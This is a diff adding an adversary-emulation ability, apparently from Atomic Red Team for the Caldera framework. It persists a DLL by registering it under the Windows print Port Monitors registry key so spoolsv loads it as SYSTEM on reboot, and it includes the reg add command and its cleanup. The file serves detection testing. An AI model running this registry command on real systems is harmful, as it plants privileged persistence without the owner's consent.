@@ -1,0 +1,38 @@
+- id: d34ef297-f178-4462-871e-9ce618d44e50
+  name: Add Port Monitor persistence in Registry
+  description: Add key-value pair to a Windows Port Monitor registry. On the subsequent
+    reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.
+  tactic: persistence
+  technique:
+    attack_id: T1547.010
+    name: 'Boot or Logon Autostart Execution: Port Monitors'
+  platforms:
+    windows:
+      sh:
+        command: reg add "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"
+          /v "Driver" /d "$PathToAtomicsFolder\T1547.010\bin\PortMonitor.dll" /t REG_SZ
+          /f
+        cleanup: reg delete "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"
+          /f >nul 2>&1
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - persistence
+  - t1547.010
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      monitor_dll:
+        description: Addition to port monitor registry key. Normally refers to a DLL
+          name in C:\Windows\System32 but an arbitrary DLL can be specified with the
+          absolute path.
+        type: path
+        default: $PathToAtomicsFolder\T1547.010\bin\PortMonitor.dll
+    technique_created: '2020-01-24T19:46:27.750Z'
+    atomic_guid: d34ef297-f178-4462-871e-9ce618d44e50
+    import_timestamp: '2025-06-24T11:15:03.856328Z'
